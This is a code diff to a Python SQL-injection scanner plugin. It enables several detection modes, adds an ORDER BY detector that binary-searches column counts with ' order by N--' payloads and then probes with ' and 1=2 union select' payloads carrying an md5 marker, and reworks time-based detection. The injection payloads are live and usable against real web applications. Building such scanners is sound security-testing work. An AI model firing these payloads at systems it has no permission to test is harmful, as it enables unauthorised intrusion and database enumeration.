@@ -23,7 +23,7 @@ from warnings import warn
 
 from copy import copy
 from random import randint, shuffle
-import time
+import time, math
 
 from urllib import quote, quote_plus, unquote, unquote_plus
 from scan_policy import sql_inject_detect_err_msg_test_cases
@@ -41,8 +41,8 @@ except ImportError:
 else:
     re.set_fallback_notification(re.FALLBACK_WARNING)
 
-#TEST_SQL_TYPE = ['ERR_MSG_DETECT','ECHO_DETECT', "BOOLEAN_DETECT", "TIMING_DETECT"]
-TEST_SQL_TYPE = ['TIMING_DETECT']
+TEST_SQL_TYPE = ['ERR_MSG_DETECT', "ORDER_BY_DETECT", "BOOLEAN_DETECT", "TIMING_DETECT"]
+#TEST_SQL_TYPE = ['TIMING_DETECT']
 
 RSP_SHORT_DURATION = 2
 
@@ -51,6 +51,12 @@ DELTA_PERCENT = 1.25
 
 #time base seconds
 DELAY_SECONDS = [3, 4, 6, 2]
+
+#order by check sign
+ORDER_BY_SIGN = 'md5(95278)'
+
+#order by md5 value
+ORDER_BY_MD5_VAL = '59b874e05f47d8f295c63e0ed2578125'
 
 #------------------------------------------------------------------------------
 class SqliPlugin(TestingPlugin):
@@ -91,8 +97,8 @@ class SqliPlugin(TestingPlugin):
 
             for test_type in TEST_SQL_TYPE:
             #self.deal_param_payload(test_type, info.url, param_dict, method = info.method, referer = info.referer)
-                self.deal_param_payload(test_type, info, method = 'GET')
-
+                if self.deal_param_payload(test_type, info, method = 'GET'):
+                    return m_return
 
         if info.has_post_params:
             print 'POST'
@@ -101,8 +107,8 @@ class SqliPlugin(TestingPlugin):
 
             for test_type in TEST_SQL_TYPE:
                 #self.deal_param_payload(test_type, info.url, param_dict, method = info.method, referer = info.referer)
-                self.deal_param_payload(test_type, info, method = 'POST')
-
+                if self.deal_param_payload(test_type, info, method = 'POST'):
+                    return m_return
 
 
         # Send the results
@@ -135,7 +141,7 @@ class SqliPlugin(TestingPlugin):
 
         def __check_if_rsp_stable_on_orig_input():
             p = get_request(url = url, allow_redirects=False)
-            if p.status != 200:
+            if p.status != '200':
                 is_timing_stable = False
 
             orig_first_time       = p.elapsed
@@ -144,7 +150,7 @@ class SqliPlugin(TestingPlugin):
             time.sleep(2)
 
             p = get_request(url = url, allow_redirects=False)
-            if p.status != 200:
+            if p.status != '200':
                 is_timing_stable = False
 
             orig_second_time        = p.elapsed
@@ -194,17 +200,32 @@ class SqliPlugin(TestingPlugin):
                         print '[+] found sql inject!'
                         return True
 
+        elif sql_detect_type == 'ORDER_BY_DETECT':
+            for k, v in param_dict.iteritems():
+
+                key = to_utf8(k)
+                value = to_utf8(v)
+
+                if self._orderby_sql_detect(k = key, v = value , url = url, method = method):
+                    print '[+] found order by sql inject!'
+                    return True
+
+
         elif sql_detect_type == "ECHO_DETECT":
             self._echo_sql_detect()
 
         elif sql_detect_type == "BOOLEAN_DETECT":
+            print '----------- BOOLEAN_DETECT -----------------------'
             for k, v in param_dict.iteritems():
 
                 key = to_utf8(k)
                 value = to_utf8(v)
 
                 self._boolean_sql_detect(k = key, v = value , url = url, method = method)
+
         elif sql_detect_type == "TIMING_DETECT":
+            print '-----------TIMING_DETECT -----------------------'
+
             if is_timing_stable == True:
                 for k, v in param_dict.iteritems():
 
@@ -212,6 +233,7 @@ class SqliPlugin(TestingPlugin):
                     value = to_utf8(v)
                     if self._timing_sql_detect(k = k, v = value, url = url, method = method, short_duration = short_duration):
                         print '[+] found time_based sql inject!'
+                        return True
 
 
     def _err_msg_sql_detect(self, response_mutants, sql_err_re):
@@ -227,6 +249,78 @@ class SqliPlugin(TestingPlugin):
 
         return False
 
+    def _orderby_sql_detect(self, **kwargs):
+        '''
+        order by 注入
+        :param kwargs:
+        :return:
+        '''
+        k = kwargs.get("k", None)
+        if k is None or not isinstance(k, str):
+            raise ValueError("Except param has not key!")
+
+        v = kwargs.get("v", None)
+
+        url = kwargs.get("url", None)
+        if url is None or not isinstance(url, URL):
+            raise ValueError("Except param has not req_uri")
+
+        method = kwargs.get('method', None)
+
+        max_bound = 100
+        min_bound = -1
+
+        lower_index, high_index = 0, max_bound
+
+        table_column = 0
+
+        max_order_column_payload = ' order by {0}--'.format( max_bound )
+        min_order_column_payload = ' order by {0}--'.format( min_bound )
+
+        p = get_request(url = url, allow_redirects = False)
+
+        if p.status != '200':
+            return False
+
+        orig_resp_body  = p.data
+        max_order_column_payload_rsp = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':max_order_column_payload, 'type': 0}, bmethod = method).data
+        min_order_column_payload_rsp = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':min_order_column_payload, 'type': 0}, bmethod = method).data
+
+        if max_order_column_payload_rsp != None and min_order_column_payload_rsp != None and (orig_resp_body != max_order_column_payload_rsp) and (orig_resp_body == min_order_column_payload_rsp):
+            #maybe exist sql_inject
+
+            while lower_index <= high_index:
+                #二分法
+                col = int(math.ceil( (lower_index + high_index) / 2))
+                column_payload = ' order by {0}--'.format(col)
+                column_payload_rsp = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':column_payload, 'type': 0}, bmethod = method, use_cache = False).data
+
+                if column_payload_rsp != None and column_payload_rsp != orig_resp_body:
+                    high_index = col
+                else:
+                    if (lower_index + 1) == high_index:
+                        table_column = lower_index
+                        break
+                    elif lower_index == high_index:
+                        table_column = high_index
+                        break
+                    lower_index = col
+
+        if table_column != 0:
+
+            Logger.log_verbose("%s maybe has order by inject!" % url.url)
+            for inject_index in range(table_column):
+                union_list = [x+1 for x in range(table_column)]
+                union_list[inject_index] = ORDER_BY_SIGN
+                union_payload = ' and 1=2 union select {0}'.format(','.join(map(str,union_list)))
+                union_payload_rsp = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':union_payload, 'type': 0}, bmethod = method, use_cache = False).data
+
+                if union_payload_rsp != None and ORDER_BY_MD5_VAL in union_payload_rsp:
+                    return True
+
+        return False
+
+
 
     def _echo_sql_detect(self, **kwargs):
         '''
@@ -234,6 +328,7 @@ class SqliPlugin(TestingPlugin):
         :return:
         '''
         pass
+
 
     def _boolean_sql_detect(self, **kwargs):
         '''
@@ -327,23 +422,30 @@ class SqliPlugin(TestingPlugin):
                 time_payload = timing_test_case_dict['input'].replace("rndstr", rand_str).replace('duration', str(delay)).replace('val', v)
 
                 delta = original_wait_time * DELTA_PERCENT
-                upper_bound = (delay * 2) + original_wait_time + delta
+                upper_bound = (delay * 2) + original_wait_time + delta + 1
                 lower_bound = original_wait_time + delay - delta
 
-                current_response_wait_time = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':time_payload, 'type': 1}, bmethod = method).elapsed
-                if upper_bound > current_response_wait_time > lower_bound:
-                    return True
+                try:
+                    current_response_wait_time = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':time_payload, 'type': 1}, bmethod = method, use_cache = False, timeout = upper_bound).elapsed
+                    if upper_bound > current_response_wait_time > lower_bound:
+                        return True
+                except Exception:
+                    return False
 
             def get_original_time():
-                p = get_request(url = url, allow_redirects=False)
+                p = get_request(url = url, allow_redirects= False)
                 return p.elapsed
+
+            bvul = True
 
             shuffle(DELAY_SECONDS)
             for delay in DELAY_SECONDS:
                 if not delay_for(get_original_time(), delay):
-                    continue
+                    bvul = False
 
-        return True
+            if bvul:
+                return True
+
 
 
      #--------------------------------------------------------------------------
